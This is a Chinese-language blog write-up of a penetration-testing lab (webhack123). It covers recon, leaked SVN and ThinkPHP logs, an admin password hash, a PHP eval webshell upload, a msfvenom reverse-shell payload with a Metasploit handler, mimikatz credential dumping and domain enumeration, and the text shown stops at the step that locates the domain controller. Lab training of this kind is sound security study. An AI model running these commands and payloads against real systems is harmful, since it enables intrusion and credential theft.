@@ -1,0 +1,973 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="X2n" />
+
+  <!-- 搜索引擎摘要：优先页面自定义 description / excerpt / 正文前 160 字，最后回落到站点 description -->
+  
+  
+    <meta name="description" content="环境搭建 靶场环境的拓扑图如下： 靶场是 webhack123 ， WEB 服务器有两块网卡， DC 是域控。 信息收集 端口探测 1 nmap -p- 192.168.1.13 nmap获取系统和版本信息 1 nmap -p 80,135,139,445,3306,3389,47001,49152,49153,491…" />
+  
+  
+    <meta name="keywords" content="X2n,Web安全,漏洞挖掘,渗透测试,SRC,内网渗透,Kubernetes 安全,云安全,安全研究,技术博客" />
+  
+
+  
+  
+  <title>
+    
+      暗月项目六内网域渗透笔记 
+      
+      
+      |
+    
+     Keep your passion for what you love !
+  </title>
+
+  
+
+  <!-- Canonical URL：避免重复内容降权 -->
+  <link rel="canonical" href="https://x2nn.github.io/2025/05/11/暗月项目六内网域渗透笔记/" />
+
+  <!-- Open Graph (Facebook / 微信 / 飞书 / LinkedIn) -->
+  <meta property="og:site_name" content="Keep your passion for what you love !" />
+  <meta property="og:title" content="暗月项目六内网域渗透笔记 | Keep your passion for what you love !" />
+  
+    <meta property="og:description" content="环境搭建 靶场环境的拓扑图如下： 靶场是 webhack123 ， WEB 服务器有两块网卡， DC 是域控。 信息收集 端口探测 1 nmap -p- 192.168.1.13 nmap获取系统和版本信息 1 nmap -p 80,135,139,445,3306,3389,47001,49152,49153,491…" />
+  
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://x2nn.github.io/2025/05/11/暗月项目六内网域渗透笔记/" />
+  <meta property="og:image" content="https://x2nn.github.io/images/avatar.png" />
+  <meta property="og:locale" content="zh_CN" />
+  
+    
+      <meta property="article:published_time" content="2025-05-11T14:19:12.000Z" />
+    
+    
+      <meta property="article:modified_time" content="2025-05-14T09:22:38.846Z" />
+    
+    
+      <meta property="article:tag" content="黄金票据" />
+    
+      <meta property="article:tag" content="域控" />
+    
+  
+
+  <!-- Twitter Card -->
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="暗月项目六内网域渗透笔记 | Keep your passion for what you love !" />
+  
+    <meta name="twitter:description" content="环境搭建 靶场环境的拓扑图如下： 靶场是 webhack123 ， WEB 服务器有两块网卡， DC 是域控。 信息收集 端口探测 1 nmap -p- 192.168.1.13 nmap获取系统和版本信息 1 nmap -p 80,135,139,445,3306,3389,47001,49152,49153,491…" />
+  
+  <meta name="twitter:image" content="https://x2nn.github.io/images/avatar.png" />
+
+  <!-- RSS 订阅：浏览器与阅读器可自动发现 -->
+  <link rel="alternate" type="application/atom+xml" title="Keep your passion for what you love ! Atom Feed" href="/atom.xml" />
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+  
+<script src="/js/progressBar.js"></script>
+
+  
+<script src="/js/headerlinkCopy.js"></script>
+
+
+  
+
+  
+
+  <!-- Cloudflare Web Analytics（零 cookie、隐私友好） -->
+  
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js"
+            data-cf-beacon='{"token": "1e1fd0957b6d4ca8a09a54a598b7b525"}'></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="" loading="lazy" decoding="async">
+      
+    </a>
+    <div class="nickname"><a href="/"></a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Category</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/collections/">
+          <a href="/collections/">Collections</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">暗月项目六内网域渗透笔记</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-05-14 17:22:38
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/" title="黄金票据">
+                    #黄金票据
+                  </a>
+                </span>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/%E5%9F%9F%E6%8E%A7/" title="域控">
+                    #域控
+                  </a>
+                </span>
+                
+              </span>
+          
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="分类"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" title="内网渗透">
+                    <b>#</b> 内网渗透
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="环境搭建" tabindex="-1"><a class="headerlink" href="#环境搭建" aria-hidden="true"></a> 环境搭建</h2>
+<p>靶场环境的拓扑图如下：</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124656889.png" alt="image-20250512124656889" loading="lazy" decoding="async"></p>
+<p>靶场是<code>webhack123</code>，<code>WEB</code>服务器有两块网卡，<code>DC</code>是域控。</p>
+<h2 id="信息收集" tabindex="-1"><a class="headerlink" href="#信息收集" aria-hidden="true"></a> 信息收集</h2>
+<h3 id="端口探测" tabindex="-1"><a class="headerlink" href="#端口探测" aria-hidden="true"></a> 端口探测</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- 192.168.1.13</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125122545.png" alt="image-20250512125122545" loading="lazy" decoding="async"></p>
+<h3 id="nmap获取系统和版本信息" tabindex="-1"><a class="headerlink" href="#nmap获取系统和版本信息" aria-hidden="true"></a> nmap获取系统和版本信息</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 80,135,139,445,3306,3389,47001,49152,49153,49154,49155,49156,49157 -A 192.168.1.13 -oA webhack</span><br></pre></td></tr></table></figure>
+<p>由扫描的信息可知，<code>web</code>服务器使用的是<code>phpstudy</code>。操作系统为<code>Windows Server 2008 R2</code></p>
+<h2 id="对网站进行测试" tabindex="-1"><a class="headerlink" href="#对网站进行测试" aria-hidden="true"></a> 对网站进行测试</h2>
+<p>在<code>Mac</code>的<code>hosts</code>文件中添加<code>192.168.1.13 www.webhack123.com</code>和<code>192.168.1.13 admin.webhack123.com</code>，这样我的<code>Mac</code>通过域名就可访问到对应的网站。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512124840963.png" alt="image-20250512124840963" loading="lazy" decoding="async"></p>
+<h3 id="ffuf目录文件扫描" tabindex="-1"><a class="headerlink" href="#ffuf目录文件扫描" aria-hidden="true"></a> ffuf目录文件扫描</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -u http://www.webhack123.com/FUZZ -w Wordslist/all.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512125641975.png" alt="image-20250512125641975" loading="lazy" decoding="async"></p>
+<h3 id="wcdb文件下载" tabindex="-1"><a class="headerlink" href="#wcdb文件下载" aria-hidden="true"></a> wc.db文件下载</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.webhack123.com/.svn/wc.db</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130405171.png" alt="image-20250512130405171" loading="lazy" decoding="async"></p>
+<p>使用<code>Navicat</code>打开数据库，可以看出使用到的框架为<code>thinkphp</code></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512130708281.png" alt="image-20250512130708281" loading="lazy" decoding="async"></p>
+<h3 id="thinkphp日志文件泄露" tabindex="-1"><a class="headerlink" href="#thinkphp日志文件泄露" aria-hidden="true"></a> thinkphp日志文件泄露</h3>
+<p>在<code>thinkphp_3.1.3</code>中，日志文件是开启的，由<code>wc.db</code>可以知道目录位置。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512131128450.png" alt="image-20250512131128450" loading="lazy" decoding="async"></p>
+<p>日志路径格式如：<a target="_blank" rel="noopener" href="http://www.webhack123.com/App/Runtime/Logs/18_06_28.log">http://www.webhack123.com/App/Runtime/Logs/18_06_28.log</a></p>
+<h3 id="提取日志获取密码" tabindex="-1"><a class="headerlink" href="#提取日志获取密码" aria-hidden="true"></a> 提取日志获取密码</h3>
+<p>使用<code>python</code>编写日志文件提取脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding：utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">&quot;http://www.webhack123.com/App/Runtime/Logs&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_urls</span>(<span class="params">patch,y</span>):</span><br><span class="line">    urls=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">32</span>):</span><br><span class="line">            <span class="keyword">if</span> i&lt;<span class="number">10</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_0%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> j&lt;<span class="number">10</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_0%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    urls.append(patch+<span class="string">&quot;/%s_%s_%s.log&quot;</span> % (y,i,j))</span><br><span class="line">                    </span><br><span class="line">    <span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line">urls = add_urls(url,<span class="string">&quot;20&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> urls:</span><br><span class="line">    req=requests.get(i)</span><br><span class="line">    <span class="keyword">if</span> req.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">    html = req.text</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;webhack123.txt&quot;</span>,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(html)</span><br></pre></td></tr></table></figure>
+<p>获取日志，并在日志中查找到泄露的管理员密码。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132623141.png" alt="image-20250512132623141" loading="lazy" decoding="async"></p>
+<p>账号为<code>admin</code>，密码的哈希为<code>74c774ef39b5b977c1fd59dbfc73c3e380a65aa3</code>，经过<code>cmd5</code>得出密码为<code>web123</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512132826440.png" alt="image-20250512132826440" loading="lazy" decoding="async"></p>
+<h3 id="host碰撞管理后台子域名" tabindex="-1"><a class="headerlink" href="#host碰撞管理后台子域名" aria-hidden="true"></a> host碰撞管理后台子域名</h3>
+<p>如果扫描目录还是找不到后台，可以尝试进行<code>host</code>碰撞出子域名。</p>
+<p>代码参考<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup>，变动了一下代码，<code>ip.txt</code>用于存放目标的<code>IP</code>地址，<code>host.txt</code>用于存放子域名前缀。这里是<code>http</code>，不需要进行<code>https</code>的爆破。运行代码，子域名和<code>IP</code>地址进行匹配。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment">#这是一个用于IP和域名碰撞匹配访问的小工具(修改过)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">lists=[]</span><br><span class="line">files = <span class="built_in">open</span>(<span class="string">&#x27;hosts_ok.txt&#x27;</span>,<span class="string">&#x27;w+&#x27;</span>)</span><br><span class="line"><span class="comment">#读取IP地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================开 始 匹 配====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> iplist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>):</span><br><span class="line">    ip = iplist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#读取host地址</span></span><br><span class="line">    <span class="comment">#http_s = [&#x27;http://&#x27;,&#x27;https://&#x27;]</span></span><br><span class="line">    http_s = [<span class="string">&#x27;http://&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> http_s :</span><br><span class="line">        <span class="keyword">for</span> hostlist <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;host.txt&quot;</span>,<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">            tmp = hostlist.strip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            host = tmp+<span class="string">&#x27;.webhack123.com&#x27;</span></span><br><span class="line">            headers = &#123;<span class="string">&#x27;Host&#x27;</span>:host,<span class="string">&#x27;User-Agent&#x27;</span>:<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36&#x27;</span>&#125;</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                r = requests.session()</span><br><span class="line">                requests.packages.urllib3.disable_warnings()</span><br><span class="line">                rhost = r.get(h + ip,verify=<span class="literal">False</span>,headers=headers,timeout=<span class="number">5</span>)</span><br><span class="line">                rhost.encoding=<span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">                title = re.search(<span class="string">&#x27;&lt;title&gt;(.*)&lt;/title&gt;&#x27;</span>, rhost.text).group(<span class="number">1</span>) <span class="comment">#获取标题</span></span><br><span class="line">                info = <span class="string">&#x27;%s -- %s 协议：%s 数据包大小：%d 标题：%s&#x27;</span> % (ip,host,h,<span class="built_in">len</span>(rhost.text),title)</span><br><span class="line">                lists.append(info)</span><br><span class="line">                files.write(info + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(info)</span><br><span class="line">            <span class="keyword">except</span> Exception :</span><br><span class="line">                error = ip + <span class="string">&quot; --- &quot;</span> + host + <span class="string">&quot; --- 访问失败！~&quot;</span></span><br><span class="line">                <span class="built_in">print</span>(error)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;====================================匹 配 成 功 的 列 表====================================&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lists:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+<p>结果如下，发现了一个<code>admin.webhack123.com</code>子域名。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143022860.png" alt="image-20250512143022860" loading="lazy" decoding="async"></p>
+<p>成功找到了后台的管理站点。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512143257291.png" alt="image-20250512143257291" loading="lazy" decoding="async"></p>
+<p>根据前面获取到的账号密码<code>admin/web123</code>可以登陆管理员界面。</p>
+<h3 id="上传文件获取webshell" tabindex="-1"><a class="headerlink" href="#上传文件获取webshell" aria-hidden="true"></a> 上传文件获取webshell</h3>
+<p>登陆到管理员界面后，进行文件的上传。设置允许上传<code>php</code>，上传一句话木马<code>&lt;?php @eval($_POST['pass']);?&gt;</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512144703229.png" alt="image-20250512144703229" loading="lazy" decoding="async"></p>
+<p>上传成功，获取<code>shell</code>的<code>url</code>为<code>http://admin.webhack123.com/Public/Upload/20250512/d58f8404ac973d0352c666b9f83056a9.php</code>，使用蚁剑进行连接。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512145624138.png" alt="image-20250512145624138" loading="lazy" decoding="async"></p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250512150325172.png" alt="image-20250512150325172" loading="lazy" decoding="async"></p>
+<h2 id="msf进行提权和信息收集" tabindex="-1"><a class="headerlink" href="#msf进行提权和信息收集" aria-hidden="true"></a> MSF进行提权和信息收集</h2>
+<h3 id="生成攻击载荷" tabindex="-1"><a class="headerlink" href="#生成攻击载荷" aria-hidden="true"></a> 生成攻击载荷</h3>
+<p><code>phpstudy</code>环境下，上传并执行<code>exe</code>文件，直接就是系统的最高权限了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.1.3 lport=12345 -f exe -o tt.exe</span><br></pre></td></tr></table></figure>
+<p>在本机的根目录会生成一个<code>tt.exe</code>文件。</p>
+<h3 id="监听上线" tabindex="-1"><a class="headerlink" href="#监听上线" aria-hidden="true"></a> 监听上线</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lhost 192.168.1.3</span><br><span class="line">lhost =&gt; 192.168.1.3</span><br><span class="line">msf6 exploit(multi/handler) &gt; set lport 12345</span><br><span class="line">lport =&gt; 12345</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p>我使用的是<code>mac m1</code>环境安装的<code>msf</code>，监听发现一直报错，连接不上<code>shell</code>。这里我卡了很久，想破脑袋，也没想到把<code>mac</code>的防火墙关了就好了😑。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513113931755.png" alt="image-20250513113931755" loading="lazy" decoding="async"></p>
+<p>成功拿到<code>shell</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513114424829.png" alt="image-20250513114424829" loading="lazy" decoding="async"></p>
+<h3 id="migrate迁移进程" tabindex="-1"><a class="headerlink" href="#migrate迁移进程" aria-hidden="true"></a> migrate迁移进程</h3>
+<p>找到合适的进程，进行进程的迁移，这里很多人使用的是<code>migrate 476</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130552170.png" alt="image-20250513130552170" loading="lazy" decoding="async"></p>
+<p>迁移成功。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513130700625.png" alt="image-20250513130700625" loading="lazy" decoding="async"></p>
+<h3 id="mimikatz哈希明文获取" tabindex="-1"><a class="headerlink" href="#mimikatz哈希明文获取" aria-hidden="true"></a> mimikatz哈希明文获取</h3>
+<p>使用<code>load kiwi</code>，加载<code>mimikatz</code>模块。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">creds_all</span><br><span class="line">creds_wdigest</span><br><span class="line">creds_tspkg</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131257484.png" alt="image-20250513131257484" loading="lazy" decoding="async"></p>
+<p><code>arp</code>可以发现更多的主机。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513131434911.png" alt="image-20250513131434911" loading="lazy" decoding="async"></p>
+<h2 id="跨网段域渗透" tabindex="-1"><a class="headerlink" href="#跨网段域渗透" aria-hidden="true"></a> 跨网段域渗透</h2>
+<h3 id="msf跨网段的域渗透" tabindex="-1"><a class="headerlink" href="#msf跨网段的域渗透" aria-hidden="true"></a> MSF跨网段的域渗透</h3>
+<p>使用<code>metasploit</code>和<code>cobalt strike</code>进行域渗透。</p>
+<h4 id="确认域环境" tabindex="-1"><a class="headerlink" href="#确认域环境" aria-hidden="true"></a> 确认域环境</h4>
+<p><code>ps</code>查看进程，进行令牌窃取，必须切换到<code>adminstrator</code>，非<code>system</code>，才能使用<code>net config workstation</code>⚠️</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133145485.png" alt="image-20250513133145485" loading="lazy" decoding="async"></p>
+<p>切换到<code>shell</code>，然后执行<code>net config workstation</code>。出现乱码情况时在获取的<code>shell</code>中执行<code>chcp 65001</code>。</p>
+<p><img src="/2025/05/11/%E6%9A%97%E6%9C%88%E9%A1%B9%E7%9B%AE%E5%85%AD%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/image-20250513133609467.png" alt="image-20250513133609467" loading="lazy" decoding="async"></p>
+<h4 id="定位域控" tabindex="-1"><a class="headerlink" href="#定位域控" aria-hidden="true"></a> 定位域控</h4>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain</span><br></pre></td></tr></table></figure>
